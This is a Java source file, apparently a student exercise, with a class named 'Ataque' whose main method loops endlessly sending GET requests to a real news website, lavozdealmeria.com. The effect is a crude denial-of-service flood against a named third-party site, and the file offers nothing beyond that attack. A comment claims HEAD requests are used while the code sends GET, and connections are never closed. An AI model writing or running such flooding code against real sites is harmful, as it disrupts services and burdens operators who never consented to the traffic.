package com.es.programacion.pruebas.cdypc;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class Ataque {

    public static String makeGetRequest(String urlString) throws IOException {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET");

        int responseCode = connection.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuilder response = new StringBuilder();
            String inputLine;

            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            return response.toString();
        } else {
            return "GET request failed: " + responseCode;
        }
    }




    public static boolean ping(String urlString) throws IOException {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("GET"); // Use HEAD method to avoid downloading the entire response

        int responseCode = connection.getResponseCode();
        return responseCode == HttpURLConnection.HTTP_OK;
    }

    public static void main(String[] args) {
        String url = "https://www.lavozdealmeria.com/";
        try {

            while (true) {
                ping(url);
            }
//            if (isReachable) {
//                System.out.println(url + " is reachable.");
//            } else {
//                System.out.println(url + " is not reachable.");
//            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}
